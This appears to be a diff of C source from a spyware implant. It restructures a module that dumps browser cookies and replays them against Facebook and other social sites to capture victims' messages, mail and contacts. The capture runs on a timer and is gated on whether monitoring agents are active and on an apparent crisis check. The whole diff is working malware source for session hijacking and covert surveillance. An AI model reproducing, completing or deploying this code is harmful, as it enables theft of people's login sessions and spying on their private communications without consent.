@@ -1,5 +1,4 @@
 
-#define SLEEP_COOKIE 30 // In secondi
 #define SOCIAL_LONG_IDLE 20 // In multipli di SLEEP_COOKIE (10 minuti)
 #define SOCIAL_SHORT_IDLE 4 // In multipli di SLEEP_COOKIE (2 minuti)
 
@@ -192,14 +191,6 @@ void DumpNewCookies()
 	DumpCHCookies();
 }
 
-void CheckProcessStatus()
-{
-	while(shared.social_process_control == SOCIAL_PROCESS_PAUSE) 
-		Sleep(500);
-	if (shared.social_process_control == SOCIAL_PROCESS_EXIT)
-		ExitProcess(0);
-}
-
 void InitSocialEntries()
 {
 	for (int i=0; i<SOCIAL_ENTRY_COUNT; i++) {
@@ -232,78 +223,74 @@ void InitSocialEntries()
 	ZeroMemory(shared.YAHOO_IE_COOKIE, sizeof(shared.YAHOO_IE_COOKIE));
 }
 
-void SocialMainLoop()
+void SocialMain_init()
 {
-	DWORD i, ret;
-	char *str;
-
 	InitSocialEntries();
 	SocialWinHttpSetup(L"http://www.facebook.com");
 	LOG_InitSequentialLogs();
+}
 
-	for (;;) {
-		// Busy wait...
-		for (int j=0; j<SLEEP_COOKIE; j++) {
-			if (!shared.is_demo_version)
-				Sleep(1000);
-			else
-				Sleep(40);
+void SocialMain_run()
+{
+	DWORD i, ret;
+	char* str;
+
+	// Se tutti gli agenti sono fermi non catturo nemmeno i cookie
+	if (!shared.bPM_IMStarted && !shared.bPM_MailCapStarted && !shared.bPM_ContactsStarted)
+		return;
+
+	// Verifica se qualcuno e' in attesa di nuovi cookies
+	// o se sta per fare una richiesta
+	for (i = 0; i < SOCIAL_ENTRY_COUNT; i++) {
+		// Se si, li dumpa
+		if (social_entry[i].wait_cookie || social_entry[i].idle == 0) {
+			DumpNewCookies();
+			break;
+		}
+	}
+
+	// Se stava aspettando un cookie nuovo
+	// e c'e', allora esegue subito la richiesta
+	for (i = 0; i < SOCIAL_ENTRY_COUNT; i++)
+		if (social_entry[i].wait_cookie && social_entry[i].is_new_cookie) {
+			social_entry[i].idle = 0;
+			social_entry[i].wait_cookie = FALSE;
+		}
+
+	for (i = 0; i < SOCIAL_ENTRY_COUNT; i++) {
+		// Vede se e' arrivato il momento di fare una richiesta per 
+		// questo social
+		if (social_entry[i].idle == 0) {
+			char domain_a[64];
 			CheckProcessStatus();
-		}
+			_snprintf_s(domain_a, sizeof(domain_a), _TRUNCATE, "%S", social_entry[i].domain);
+			if (str = GetCookieString(domain_a)) {
+				if (!IsCrisisNetwork() && social_entry[i].RequestHandler)
+					ret = social_entry[i].RequestHandler(str);
+				else
+					ret = SOCIAL_REQUEST_NETWORK_PROBLEM;
+				SAFE_FREE(str);
 
-		// Se tutti gli agenti sono fermi non catturo nemmeno i cookie
-		if (!shared.bPM_IMStarted && !shared.bPM_MailCapStarted && !shared.bPM_ContactsStarted)
-			continue;
-
-		// Verifica se qualcuno e' in attesa di nuovi cookies
-		// o se sta per fare una richiesta
-		for (i=0; i<SOCIAL_ENTRY_COUNT; i++) {
-			// Se si, li dumpa
-			if (social_entry[i].wait_cookie || social_entry[i].idle == 0) {
-				DumpNewCookies();
-				break;
-			}
-		}
-
-		// Se stava aspettando un cookie nuovo
-		// e c'e', allora esegue subito la richiesta
-		for (i=0; i<SOCIAL_ENTRY_COUNT; i++) 
-			if (social_entry[i].wait_cookie && social_entry[i].is_new_cookie) {
-				social_entry[i].idle = 0;
-				social_entry[i].wait_cookie = FALSE;
-			}
-		
-		for (i=0; i<SOCIAL_ENTRY_COUNT; i++) {
-			// Vede se e' arrivato il momento di fare una richiesta per 
-			// questo social
-			if (social_entry[i].idle == 0) { 
-				char domain_a[64];
-				CheckProcessStatus();
-				_snprintf_s(domain_a, sizeof(domain_a), _TRUNCATE, "%S", social_entry[i].domain);		
- 				if (str = GetCookieString(domain_a)) {
-					if (!IsCrisisNetwork() && social_entry[i].RequestHandler)
-						ret = social_entry[i].RequestHandler(str);
-					 else
-						ret = SOCIAL_REQUEST_NETWORK_PROBLEM;
-					SAFE_FREE(str);
-
-					if (ret == SOCIAL_REQUEST_SUCCESS) {
-						social_entry[i].idle = SOCIAL_LONG_IDLE;
-						social_entry[i].wait_cookie = FALSE;
-					} else if (ret == SOCIAL_REQUEST_BAD_COOKIE) {
-						social_entry[i].idle = SOCIAL_LONG_IDLE;
-						social_entry[i].wait_cookie = TRUE;
-					} else { // network problems...
-						social_entry[i].idle = SOCIAL_SHORT_IDLE;
-						social_entry[i].wait_cookie = TRUE;
-					}
-				} else { // no cookie = bad cookie
+				if (ret == SOCIAL_REQUEST_SUCCESS) {
+					social_entry[i].idle = SOCIAL_LONG_IDLE;
+					social_entry[i].wait_cookie = FALSE;
+				}
+				else if (ret == SOCIAL_REQUEST_BAD_COOKIE) {
 					social_entry[i].idle = SOCIAL_LONG_IDLE;
 					social_entry[i].wait_cookie = TRUE;
 				}
-			} else 
-				social_entry[i].idle--;
+				else { // network problems...
+					social_entry[i].idle = SOCIAL_SHORT_IDLE;
+					social_entry[i].wait_cookie = TRUE;
+				}
+			}
+			else { // no cookie = bad cookie
+				social_entry[i].idle = SOCIAL_LONG_IDLE;
+				social_entry[i].wait_cookie = TRUE;
+			}
 		}
+		else
+			social_entry[i].idle--;
 	}
 }
 
